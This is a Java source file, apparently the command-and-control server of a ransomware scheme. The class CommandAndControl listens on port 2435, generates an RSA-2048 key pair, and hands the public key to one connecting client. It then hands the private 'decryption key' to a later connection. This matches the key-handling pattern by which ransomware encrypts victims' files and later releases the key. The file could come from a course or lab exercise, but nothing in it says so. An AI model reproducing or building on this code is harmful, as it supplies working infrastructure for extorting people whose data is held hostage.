import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;

public class CommandAndControl {
	
	private static final int PORT_NUM = 2435;
    private static PrivateKey privateKey;
    private static PublicKey publicKey;
	
	public static void main(String [] args) {
		ServerSocket serverSocket = null;
		try {
			serverSocket = new ServerSocket(PORT_NUM);
		} catch (IOException e) {
			System.out.println("Could not create server on port: " + PORT_NUM);
			System.exit(1);
		}finally {
			if(serverSocket == null) {
				System.out.println("Could not find a free port.");
				System.exit(1);
			}
		}

		createRSAKeyPair();

		// These can be sent using the socket connection
		PublicKeySer publicKeySer = new PublicKeySer(publicKey);
		PrivateKeySer privateKeySer = new PrivateKeySer(privateKey);
		
		// Try to connect to a host and send the public key
		Socket clientSocket = null;
		try {
			System.out.println("Waiting for public key connection");
			clientSocket = serverSocket.accept();
	        OutputStream outputStream = clientSocket.getOutputStream();
	        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
	        objectOutputStream.writeObject(publicKeySer);
		} catch (IOException e) {
			System.out.println("Could not connect to a client.");
		}finally {
			if(clientSocket == null) {
				System.out.println("Client socket is null.");
			}else {
				System.out.println("Client connection made!");
			}
		}
		
		try {
			clientSocket.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		// Send decryption key
		try {
			System.out.println("Waiting for decryption connection");
			clientSocket = serverSocket.accept();
	        OutputStream outputStream = clientSocket.getOutputStream();
	        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
	        objectOutputStream.writeObject(privateKeySer);
		} catch (IOException e) {
			System.out.println("Could not connect to a client.");
		}finally {
			if(clientSocket == null) {
				System.out.println("Client socket is null.");
			}else {
				System.out.println("Client connection made!");
			}
		}
	}
	
	
    private static void createRSAKeyPair() {
        KeyPairGenerator keyGen = null;
		try {
			keyGen = KeyPairGenerator.getInstance("RSA");
		} catch (NoSuchAlgorithmException e) {
			System.out.println("Could not generate RSA key pair.");
		}finally {
			if(keyGen == null) {
				System.exit(1);
			}
		}
		
        keyGen.initialize(2048);
        KeyPair keyPair = keyGen.generateKeyPair();
        
        privateKey = keyPair.getPrivate();
        publicKey = keyPair.getPublic();
    }
}
